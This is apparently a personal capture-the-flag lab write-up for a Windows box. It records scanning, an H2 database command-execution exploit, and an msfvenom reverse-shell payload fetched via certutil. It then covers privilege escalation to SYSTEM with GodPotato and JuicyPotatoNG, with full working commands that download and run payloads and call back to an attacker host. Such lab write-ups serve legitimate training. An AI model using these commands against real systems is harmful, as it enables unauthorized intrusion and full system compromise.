# NMAP

```
sudo nmap -sC -sV 192.168.247.66 -oN nmap-jacko
```

![[PG/Windows/attachments/Pasted image 20250705214502.png]]

All ports
![[PG/Windows/attachments/Pasted image 20250705214714.png]]

# SMB 

![[PG/Windows/attachments/Pasted image 20250705214838.png]]
- boo

# Web

Port 8082
![[PG/Windows/attachments/Pasted image 20250705214912.png]]


## Feroxbuster 

```
feroxbuster -u http://192.168.247.66:8082 -x jsp -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```


This public exploit did work to get command execution.
https://www.exploit-db.com/exploits/49384
![[PG/Windows/attachments/Pasted image 20250705220252.png]]

Now just need to turn it into a reverse shell..

Maybe PowerShell cradle?

Systeminfo

![[PG/Windows/attachments/Pasted image 20250705222347.png]]

Use msfvenom to create a payload.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.152 LPORT=9001 -f exe > rev.exe
```

Upload rev shell like dis 

```
"certutil -split -urlcache -f http://192.168.45.152/rev.exe C:\\Users\\tony\\rev.exe"
```

Can remove the "create alias" portion of the script

```
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -split -urlcache -f http://192.168.45.154/rev.exe C:\\Users\\tony\\rev.exe").getInputStream()).useDelimiter("\\Z").next()');
```

Upload payload
![[PG/Windows/attachments/Pasted image 20250705225415.png]]

Execute payload 

```
"C:\\Users\\tony\\rev.exe"
```

![[PG/Windows/attachments/Pasted image 20250705225757.png]]

Catch shell 

![[PG/Windows/attachments/Pasted image 20250705225826.png]]

e8f19c891059489af013c56fa49f7e95

# Priv Esc 

We saw SeImpersonatePrivilege earlier. 

whoami only executes from one location...

Fix weird paths 
```
set PATH=%PATH%;C:\windows\system32;C:\windows;C:\windows\System32\Wbem;C:\windows\System32\WindowsPowerShell\v1.0\;C:\windows\System32\OpenSSH\;C:\Program Files\dotnet\
```
## God Potato

Determine .NET environment version

```
cd reg query "HKLM\Software\Microsoft\Net Framework Setup\NDP" /s
```

or 

```
Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse
```

Looks like .NET v4 

![[PG/Windows/attachments/Pasted image 20250706001206.png]]

Transfer GodPotato version 4 to target box 

```
iwr http://192.168.45.152:81/GodPotato-NET4.exe -outfile GodPotato-NET4.exe
```

Test with 'whoami'

```
.\GodPotato-NET4.exe -cmd "whoami"
```

HEHEHEHHEHE
![[PG/Windows/attachments/Pasted image 20250706001624.png]]

We can create another msfvenom reverse shell

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.152 LPORT=9002 -f exe > rev2.exe
```

Transfer 

![[PG/Windows/attachments/Pasted image 20250706002038.png]]

Execute payload with godpotato 

```
.\GodPotato-NET4.exe -cmd "c:\users\tony\Documents\rev2.exe"
```

![[PG/Windows/attachments/Pasted image 20250706002247.png]]

The shell died. wat

## Maybe Print Spoofer will work?
https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0
```
iwr -uri http://192.168.45.152:81/PrintSpoofer64.exe -outfile printspoofer.exe
```

This didn't work.

## JuicyPotatoNG

Test 

```
.\jp.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami > C:\juicy.txt"
```

![[PG/Windows/attachments/Pasted image 20250706004115.png]]
yey

Execute rev2.exe

```
.\jp.exe -t * -p "C:\Users\tony\Documents\rev2.exe"
```

![[PG/Windows/attachments/Pasted image 20250706004609.png]]

Catch system shell

![[PG/Windows/attachments/Pasted image 20250706004649.png]]

![[PG/Windows/attachments/Pasted image 20250706004702.png]]
